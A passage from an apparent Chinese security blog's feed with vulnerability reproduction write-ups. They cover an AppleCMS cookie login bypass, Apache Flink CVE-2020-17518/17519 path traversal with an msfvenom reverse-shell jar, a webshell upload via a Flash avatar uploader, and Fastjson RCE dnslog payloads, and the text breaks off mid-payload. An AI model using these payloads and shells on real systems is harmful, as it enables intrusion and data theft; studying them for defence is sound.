data-hmacdigest="276f157184cd8e1ca20264bf88141b672179dd8536a7c26e4d5d57d9a2d8ab0d">85b971ddb3dbaba862845c10580e1e5bcd59506d267f9e39182089a35c7d5a7114cac787272ced9bb19b0d213b5614d3b28126ba9ba4b5008a192379fcee80da7839580cc38dc0cd481f52617dcd0621a74d48c5b38be075bc787ebda89a14f53ec9c0428c86c72494c7e19eb646bada08cb867a089fba80f07b6f3b68cce2be11e8d9c647ffff6bc7cfb68123d1a4f171e6c2149610882924070e47c164a9cb23428cdeef7b281f28dbd81d5ee213489fc9a7fda3f5872413f39e75c7f1ab8f83a43e320f2ef7885fa245c2c1093445804abf0e8a79c19654ac55a32eaaeed839c355a16b3ca23c9c3c7168d8d074fb920782ac1f247ab19414dacb128c2babc359f3bae61a181c48281dbbd55db4f6d733b1350ef15f77292e9483630ee1a1cdc0603c07023a5093eb4a031916c9be95dc806d53ae2a04b18d2fa2a8d31ac0fba8d88cadda0964818b2531dec44da211f5a9994ba1c843eacea325f44ab87588dc82705cd6954ce4b9d0853661537ea409a8e3044693c8e3481752cbb906c24f35e96f52230158b9c02874b3d11b31f7483b49623489c770d073465b2cd1dc812d4da316170ab06b526815d59b46fc8330bc19626972d6285c4fbf655b74c3db2f7052ce7477ff8929f67052471cd04fb6fb904f9125e31d1353a66b15ae46aafd70b9bc677329b397467be7c8055e63efcf64cbf2802ce0f424a4ac9e6e60c368e70644a145e847c4304e2adb42ab3e4b4812a45541dbac4550af36729cee7cf51c944b9d74a16e0bc4c32c6dd157a54c890534d8d6d9583697de8785c106696d67794912f3ba8e03b25e611caddf344f7e9220b71e8ce165a47133784907024f58101a031fd4ca1d0d3a0e2242b1851b81591cf24a49bf3cbcd94d0d5c2ca51989b7739ada2f17ee4e39f4d714924ac3c760fecba9f700a293bfd8c24fee21907c98118aed25b68138b8d17dc85e46828fb4b667e93cea736b10af022ea6991db1bff32a8080a068fcd317f4fb0fb0d65d528d59687ac1a1ad2aa3f591d9c7d30446951bf84e07d1f1bbc0c440dbe1b81c12be3648ea234f7b45912cce16d9e961df205b2fb20500286cacc1294d37e87a1737e5b07e338bcefe4a4a04373e8fac3cc0b86b49234a778ca2cdbc7cc6f7c802c968d2f57b98bfd2896c11215d56003e812cbfaa98b0b9f96293e0cb33882f825cd55c141154aeba23fc08a86b061b03457812ebc3d704a495ec1753e8226a67d31fe9c84eae427024c758c9219651e2bf1cd434722a68367f26190771fe40e0bedf9780d04e5d9ab94dc06364c6e3eb2ea4b684d5c6b4402fe61b5932b567c7a3153b014cc3ace6cdfa208c7eb2578f5cbb5663b91b6ead71c341ecf284ed7c713134189441e41b7106de2deeee4c2fb0278b7864b88fe51b4943e93dabeab27e3ad973ae480c0a70e8360ad15248a6ed1f8f370256d6ec0dffeaf700712528ddd867390b96a579e94acb1733435bae43516c05a8b9a83c0499b857e593976015fc4d8bba34fba4c596d0ff9f2ce168cac11f4b84a0882e757bbccdb4231dfb804f9d088a63d2b2eca4bab11cc32ac60328c212fb88e10226e9de73951a2c8578402f7a001581e60bd373c4396c92a840c73dc133e7c15685b0d13ed8549a30f8e2cd8187ad91025ed12a5f196ccb5264ed3a808bcd3483ad0b8d2e756fcb358bb7afd5e48c133ed7b27f40a7100446290fae17824f2819d95d07204c6120d687a494259c0f7d7bb7032b59d76b32cb791b5dd078d1176ea6871ab7227a7dbaaeaf211422b2de5119d3d8b5a8c14f93681d7c3e3dc148a6578474568682f409927b9ddcf61c52eb633dfdb9e392e9f2ec8936c94f792f5ad037fc1abf90c55df8d11c952d725ef2a40750278773e6a0f34ec122f72b49fae5ae246b87994cb9a35fac4f7b8911f473a273b5918556ad5754149aa19bcfcf4ab66a6e1f1e8be839611a426f4a4f57b4f943c7578c7b4223561f52c7ccf9f1e66e4d3adf13201213cb66bb3ab98e67fdf39b9ce248b8aa699ee72e2886563d3735eb4403d96f9f1ea6ab2486206c8a63d74ff0bbb774e98c256a8d350caab7c9cac9612973ff6f53d0ce782a7ce965813de8c771e0eb5c3dc47ea016e46ad25375d7d050814ef65e25a982b7a6e6749ef2470e4b1b285e8ff9dd87a83412f360c3b181d442343f516b41005bf7297dda54f41e288bbbcdc633654c9d1b7c5d2fa556c97f73f056277b54a96042980c0b86d9aa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苹果CMS未授权登录审计复现</title>
      <link href="2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>苹果CMS爱好者平台由多个资深站长自由组建的,是以影视系统,漫画系统,小说系统,写真系统,教育系统等内容系统为主的交流学习平台,平台开放后深受众多站长们的喜爱</p><p>后台登录校验不严格，导致未授权登录后台</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先直接访问</p><p><a href="http://www.mm.com/admin.php/admin/index/index.html">www.mm.com/admin.php/admin/index/index.html</a></p><p>根据thinkphp框架特性POC为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_id=think:[&quot;like&quot;,&quot;%&quot;]; admin_name=think:[&quot;like&quot;,&quot;%&quot;]; admin_check=think:true</span><br></pre></td></tr></table></figure><p>抓包，修改cookie中的内容</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/1.png"></p><p><a href="http://www.mm.com/admin.php/admin/index/welcome.html">http://www.mm.com/admin.php/admin/index/welcome.html</a></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/2.png"></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/3.png"></p><p>cookie设置一下全局变量，就不用每次抓包加cookie</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/4.png"></p><h1 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h1><p>漏洞所在文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\application\common\model\Admin.php</span><br></pre></td></tr></table></figure><p>漏洞文件代码：(只贴上相关代码)</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第149-151行当账号密码正确的时候，会将登录信息存储到cookie中</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/6.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第167-169行，接收Cookie中的三个变量的值</span><br><span class="line">第176-178行，将接收到的三个值存储到<span class="variable">$where</span>这个数组中</span><br><span class="line">第180行，将<span class="variable">$where</span>中的数据在数据库中进行查询，当查询到将可以登录，上面利用了cookie获取登录验证的，我们可以利用thinkphp的特性将cookie中的值设置为模糊查询的，这样就相当于利用了账号密码登录</span><br><span class="line">第181行，<span class="keyword">if</span>(empty(<span class="variable">$info</span>))判断查询数据中是否为空，不为空就继续执行代码</span><br><span class="line">第187行，因为我们传admin_check=think:<span class="literal">true</span>，所以 <span class="keyword">if</span>(<span class="variable">$login_check</span> != <span class="variable">$admin_check</span>)，肯定会不成立，最后登录成功</span><br></pre></td></tr></table></figure><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>1.可以将登录信息记录到session中，验证登录从session中判断，从而达到不能伪造的cookie登录的目的</p><p>比如</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/7.png"></p><p>2.升级到最新版本</p><p><strong>本文仅作于漏洞研究，禁止用于非法用途</strong></p><p><strong>造成一切后果，与作者无关</strong></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink CVE-2020-17519/17518 漏洞复现</title>
      <link href="2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=<span class="string">&quot;APACHE-Flink&quot;</span></span><br></pre></td></tr></table></figure><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API</p><h1 id="CVE-2020-17518-文件写入漏洞"><a href="#CVE-2020-17518-文件写入漏洞" class="headerlink" title="CVE-2020-17518: 文件写入漏洞"></a>CVE-2020-17518: 文件写入漏洞</h1><p>攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://ip:8081/jars/upload HTTP/1.1</span><br><span class="line">Host: ip:8081</span><br><span class="line">Content-Length: 245</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywk4sMP1TfX46mdWZ</span><br><span class="line">Origin: http://ip:8081</span><br><span class="line">Referer: http://ip:8081/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywk4sMP1TfX46mdWZ</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;jarfile&quot;</span>; filename=<span class="string">&quot;../../../../../../../tmp/hello&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p><p>URL：</p><p><a href="http://ip:8081/jobmanager/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fhello">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fhello</a></p><p>估计是设置了禁止执行脚本，%252f为/的两次url编码</p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell</p><p>Msf生成jar格式的马</p><p>lhost为VPS的ip，lport为VPS接收shell的端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp lhost=ip lport=1116 -f jar &gt;/root/123.jar</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p><h1 id="CVE-2020-17519-文件读取漏洞"><a href="#CVE-2020-17519-文件读取漏洞" class="headerlink" title="CVE-2020-17519: 文件读取漏洞"></a>CVE-2020-17519: 文件读取漏洞</h1><p>Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p><p><strong>POC</strong></p><p><a href="http://IP:PORT/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd">http://IP:PORT/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</a></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方已发布安全版本，请及时下载升级至安全版本</p><p><a href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/227668">https://www.anquanke.com/post/id/227668</a></p><p><a href="https://mp.weixin.qq.com/s/zBmxTEQsZsJWKS_hFZNUMA">https://mp.weixin.qq.com/s/zBmxTEQsZsJWKS_hFZNUMA</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于flash的上传</title>
      <link href="2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/"/>
      <url>2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在一次渗透过程中所碰到的上传，一开始以为没搞头了，谁知最后柳暗花明又一村</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/1.png"></p><p>在这次测试中也踩了一点坑，有时候上传点可能是基于flash的，需要将flash开启才能够正常上传。之前有一次在测试上传点的时候用的火狐浏览器，它也没如下图的提示</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/2.png"></p><p>因为之前测的那个站点没有开启flash也是能够正常上传图片的，但是传不了马子。当我将浏览器换成谷歌浏览器，它就提示了，我将flash开启之后，直接改后缀传马子，立马拿shell</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>在打开测试站点的时候，谷歌浏览器就提示</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/3.png"></p><p>假如没开启的话是一片空白的</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/4.png"></p><p>将flash开启之后，如下图，说实话在测上传的时候有点讨厌碰到这种类型的上传，在上传的时候会切割图片，你所制作的图片马也可能因此失效</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/5.png"></p><p>话不多说，先直接上图片测试看看能不能上传，当看到这个我有点看傻了，这什么加密，aes加密吗？</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/6.png"></p><p>哎，心想既然都弄到这里了，改个上传后缀看看吧</p><p>结果还真中奖了，500报错，说明这个点是可以进行上传的</p><p>麻烦的是，不知道怎么将马子加进去，因为图片是经过切割的，所以图片马也就没有起到作用</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/7.png"></p><p>期间，我尝试翻看html源码，在看js的时候看的脑壳疼(没学过js)，看来看去也没看出一个所以然来。只能在那里瞎几把乱试了，最后可能是老天看我可怜，给我试了出来，看来是一开始想复杂了</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/8.png"></p><p>只要将马子用base64编码替换图片的内容即可getshell</p><p>首先，将冰蝎马编码成base64的</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/9.png"></p><p>middle_avatar、big_avatar及little_avatar，都是图片中的内容，所以这3个都要替换成base64后的冰蝎马</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/10.png"></p><p>将后缀修改为jsp之后，发包即可，最后在头像处拿到shell的地址</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/11.png"></p><p>至此，就结束啦!</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>在进行渗透的时候，多尝试，万一一不小心就拿下了呢？这个站头像有可能是使用了base64进行传输，最后因为某些原因没有来得及看源码</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson RCE漏洞复现</title>
      <link href="2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>但行好事，莫问前程</p><h1 id="docker配置"><a href="#docker配置" class="headerlink" title="docker配置"></a>docker配置</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">dokcer安装，以ubuntu为例</span></span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">安装docker-compose</span></span><br><span class="line">sudo apt install docker-compose</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载项目</span></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入某一个漏洞/环境的目录</span></span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自动化编译环境</span></span><br><span class="line">docker-compose build</span><br><span class="line">1、启动docker服务</span><br><span class="line">service docker start</span><br><span class="line">2、生成自启动服务</span><br><span class="line">systemctl enable docker.service</span><br><span class="line">3、查看服务状态，Active状态为：active（running）</span><br><span class="line">systemctl status docker.service</span><br><span class="line">需要把用户添加到docker用户组</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">4.重启docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">5.进入新的会话，再重新编译即可</span><br><span class="line">newgrp - docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动整个环境</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">测试完成后，删除整个环境</span></span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p><p>下载完成，访问ip:8090即可</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><h1 id="安装Maven"><a href="#安装Maven" class="headerlink" title="安装Maven"></a>安装Maven</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载</span></span><br><span class="line">wget https://mirrors.bfsu.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">创建一个目录进行存放</span></span><br><span class="line">mkdir /opt/maven</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在最下面增加</span></span><br><span class="line">export MAVEN_HOME=/opt/maven/apache-maven-3.6.3</span><br><span class="line">export PATH=$MAVEN_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">使修改的配置立刻生效</span></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p><p>出现这种情况，使用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install maven</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p><h1 id="安装RMI服务"><a href="#安装RMI服务" class="headerlink" title="安装RMI服务"></a>安装RMI服务</h1><p>使用marshalsec项目，启动RMI服务，监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> marshalsec/</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译项目</span></span><br><span class="line"></span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>编译成功</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p><h1 id="Fastjson反序列化RCE漏洞复现"><a href="#Fastjson反序列化RCE漏洞复现" class="headerlink" title="Fastjson反序列化RCE漏洞复现"></a>Fastjson反序列化RCE漏洞复现</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>fastjson在解析json的过程中,支持使用@type字段来指定反序列化的类型,并调用该类的set/get方法来访问属性,当组件开启了autotype功能并且反序列化不可信数据时,攻击者可以构造数据,使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。在Fastjson 1.2.47及以下版本中,利用其缓存机制可实现对未开启autotype功能的绕过。详细的原理分析:<a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Fastjson1.2.24以及之前的所有版本</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以使用圈子社区的工具进行扫描</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p><p>Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test2.famvda.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.URL&quot;</span>, <span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;&#125;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;:<span class="string">&quot;aaa&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>手工检测</p><p>将content‐type改为为json格式</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p><p>但是用这个工具的payload的有问题，老是500</p><p>在我一灯师傅文章里找到的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">盲打payload：</span><br><span 